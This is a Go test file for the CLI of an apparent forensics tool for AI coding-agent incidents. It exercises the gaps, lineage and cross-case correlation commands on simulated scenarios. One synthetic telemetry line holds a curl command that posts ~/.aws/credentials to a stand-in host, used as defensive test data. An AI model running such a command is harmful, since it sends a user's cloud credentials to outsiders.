package cli

import (
	"bytes"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/efij/AgentDFIR/v5/internal/analysis"
	"github.com/efij/AgentDFIR/v5/internal/casepkg"
	"github.com/efij/AgentDFIR/v5/internal/collector"
	"github.com/efij/AgentDFIR/v5/internal/gaps"
	"github.com/efij/AgentDFIR/v5/internal/lineage"
	"github.com/efij/AgentDFIR/v5/internal/overlay"
	"github.com/efij/AgentDFIR/v5/internal/products"
	"github.com/efij/AgentDFIR/v5/internal/simulate"
)

// scenarioPackage collects a simulate scenario into a sealed package; the
// caller decides whether and how to analyze it.
func scenarioPackage(t *testing.T, scenario string) string {
	t.Helper()
	root := filepath.Join(t.TempDir(), "home")
	sc, ok := simulate.ByID(scenario)
	if !ok {
		t.Fatalf("unknown scenario %s", scenario)
	}
	if err := sc.Run(root); err != nil {
		t.Fatal(err)
	}
	pkg := filepath.Join(t.TempDir(), "case.adfir")
	b, err := casepkg.New(pkg, "GRAPH-"+scenario, casepkg.CaseInfo{OperatorOSUser: "tester"})
	if err != nil {
		t.Fatal(err)
	}
	man, err := products.ManifestAllPlatforms("claude-code")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := collector.Run(b, man, collector.Options{ProfileRoot: root, ConfigRoot: filepath.Join(root, ".claude"), SystemRoot: root, Product: "claude-code"}); err != nil {
		t.Fatal(err)
	}
	if err := b.Seal(); err != nil {
		t.Fatal(err)
	}
	b.Close()
	return pkg
}

// capture runs Main with stdout captured.
func capture(t *testing.T, args ...string) (int, string) {
	t.Helper()
	old := os.Stdout
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	os.Stdout = w
	done := make(chan []byte)
	go func() { b, _ := io.ReadAll(r); done <- b }()
	code := Main(args)
	w.Close()
	os.Stdout = old
	return code, string(<-done)
}

func TestGapsCommand(t *testing.T) {
	pkg := scenarioPackage(t, "orphan-agent")
	// Not analyzed yet: gaps analyzes first, and analysis writes the overlay.
	code, out := capture(t, "gaps", pkg)
	if code != 0 {
		t.Fatalf("gaps exit %d:\n%s", code, out)
	}
	for _, want := range []string{"KNOWN", "UNKNOWN", "VERIFY NEXT", "The parent of agent adad4e2c is not in the case", "Process telemetry"} {
		if !strings.Contains(out, want) {
			t.Errorf("gaps output lacks %q:\n%s", want, out)
		}
	}
	if !overlay.Exists(filepath.Join(pkg, "normalized", "coverage.json")) || !overlay.Exists(filepath.Join(pkg, "normalized", "lineage.json")) {
		t.Fatal("analysis did not write the coverage and lineage overlays")
	}
	code, out = capture(t, "gaps", pkg, "--json")
	if code != 0 {
		t.Fatalf("gaps --json exit %d", code)
	}
	var rep gaps.Report
	if err := json.Unmarshal([]byte(out), &rep); err != nil {
		t.Fatalf("gaps --json is not JSON: %v\n%s", err, out)
	}
	if rep.Schema != gaps.Schema || len(rep.Chains.Orphans) != 1 || rep.Chains.Orphans[0].AgentID != "adad4e2c" {
		t.Fatalf("coverage: %+v", rep.Chains)
	}
	if code, _ := capture(t, "gaps", pkg, "extra"); code != 2 {
		t.Errorf("stray argument exit %d, want 2", code)
	}
}

// End to end with telemetry: analyze --endpoint pairs the exfiltration
// command with its process, the process with its connection by pid, and
// coverage reports the telemetry window and the commands outside it.
func TestLineageWithEndpointTelemetry(t *testing.T) {
	pkg := scenarioPackage(t, "toxic-chain")
	log := filepath.Join(t.TempDir(), "edr.jsonl")
	lines := []string{
		`{"time":"2026-09-10T09:01:55Z","kind":"process","pid":900,"ppid":1,"exe":"/usr/local/bin/node","cmdline":"node /usr/local/lib/node_modules/@anthropic-ai/claude-code/cli.js"}`,
		`{"time":"2026-09-10T09:02:01Z","kind":"process","pid":901,"ppid":900,"exe":"/usr/bin/curl","cmdline":"curl -s -X POST https://cdn.acme-metrics.example/p -d @/Users/dev/.aws/credentials"}`,
		`{"time":"2026-09-10T09:02:02Z","pid":901,"ppid":900,"exe":"/usr/bin/curl","dest_ip":"198.51.100.7","dest_port":443}`,
		`{"time":"2026-09-10T09:02:10Z","kind":"process","pid":950,"ppid":1,"exe":"/usr/sbin/cron","cmdline":"cron -f"}`,
	}
	if err := os.WriteFile(log, []byte(strings.Join(lines, "\n")+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if code, out := capture(t, "analyze", pkg, "--endpoint", log); code != 0 && code != 3 {
		t.Fatalf("analyze exit %d:\n%s", code, out)
	}
	code, out := capture(t, "lineage", pkg, "--format", "json")
	if code != 0 {
		t.Fatalf("lineage exit %d:\n%s", code, out)
	}
	var g lineage.Graph
	if err := json.Unmarshal([]byte(out), &g); err != nil {
		t.Fatalf("lineage JSON: %v\n%s", err, out)
	}
	var execEdge, pidEdge *lineage.Edge
	for i, e := range g.Edges {
		if e.Relation == "executed_as" {
			execEdge = &g.Edges[i]
		}
		if e.Relation == "connected_to" && e.Basis == lineage.BasisEndpointPID && strings.HasSuffix(e.To, "198.51.100.7") {
			pidEdge = &g.Edges[i]
		}
	}
	if execEdge == nil || execEdge.Confidence != "HIGH" || !strings.HasPrefix(execEdge.Basis, "correlated within ±3s") {
		t.Fatalf("no correlated process edge: %+v", g.Edges)
	}
	if pidEdge == nil {
		t.Fatalf("no pid edge to the connection: %+v", g.Edges)
	}
	for _, n := range g.Nodes {
		if strings.Contains(n.ID, "cron") || n.Attrs["exe"] == "/usr/sbin/cron" {
			t.Errorf("an unrelated process entered the graph: %+v", n)
		}
	}
	// Finding scope, the other renderers, and bad selectors.
	if code, out := capture(t, "lineage", pkg, "--finding", "CHAIN_SECRET_TO_EXFIL", "--format", "mermaid"); code != 0 || !strings.HasPrefix(out, "flowchart LR") {
		t.Fatalf("finding mermaid exit %d:\n%s", code, out)
	}
	if code, out := capture(t, "lineage", pkg, "--format", "dot"); code != 0 || !strings.HasPrefix(out, "digraph lineage {") {
		t.Fatalf("dot exit %d:\n%s", code, out)
	}
	if code, out := capture(t, "lineage", pkg); code != 0 || !strings.Contains(out, "--executed_as-->") {
		t.Fatalf("text exit %d:\n%s", code, out)
	}
	if code, _ := capture(t, "lineage", pkg, "--finding", "NO_SUCH_RULE"); code != 1 {
		t.Errorf("unknown finding exit %d, want 1", code)
	}
	if code, _ := capture(t, "lineage", pkg, "--finding", "x", "--session", "y"); code != 2 {
		t.Errorf("exclusive flags exit %d, want 2", code)
	}
	if code, _ := capture(t, "lineage", pkg, "--format", "png"); code != 2 {
		t.Errorf("bad format exit %d, want 2", code)
	}
	// Coverage knows the telemetry window and the pairing's clock offset.
	cov := analysis.LoadCoverage(pkg)
	if cov == nil || len(cov.Witness.Sources) == 0 || cov.Witness.Sources[0].Name != "endpoint telemetry" || cov.Clock.EndpointOffset == nil {
		t.Fatalf("coverage after --endpoint: %+v", cov)
	}
}

func TestCorrelateCasesCommand(t *testing.T) {
	a, b := scenarioPackage(t, "toxic-chain"), scenarioPackage(t, "toxic-chain")
	// b is not analyzed: refused, with the command that fixes it.
	if _, err := analysis.Run(a, analysis.Options{}); err != nil {
		t.Fatal(err)
	}
	if code, _ := capture(t, "correlate-cases", a, b); code != 1 {
		t.Fatalf("unanalyzed package exit %d, want 1", code)
	}
	if _, err := analysis.Run(b, analysis.Options{}); err != nil {
		t.Fatal(err)
	}
	code, out := capture(t, "correlate-cases", a, b, "--json")
	if code != 0 {
		t.Fatalf("correlate-cases exit %d:\n%s", code, out)
	}
	var rep struct {
		Schema string `json:"schema"`
		Shared []struct {
			Kind string `json:"kind"`
			Key  string `json:"key"`
		} `json:"shared"`
	}
	if err := json.Unmarshal([]byte(out), &rep); err != nil {
		t.Fatalf("JSON: %v\n%s", err, out)
	}
	kinds := map[string]bool{}
	for _, s := range rep.Shared {
		kinds[s.Kind] = true
	}
	// Two collections of the same synthetic machine share its session and
	// its exfiltration destination.
	for _, k := range []string{"session_id", "network_destination", "mcp_server"} {
		if !kinds[k] {
			t.Errorf("no shared %s in %+v", k, rep.Shared)
		}
	}
	if code, out := capture(t, "correlate-cases", a, b); code != 0 || !bytes.Contains([]byte(out), []byte("cdn.acme-metrics.example")) {
		t.Fatalf("text exit %d:\n%s", code, out)
	}
	if code, _ := capture(t, "correlate-cases", a); code != 2 {
		t.Errorf("one package exit %d, want 2", code)
	}
}
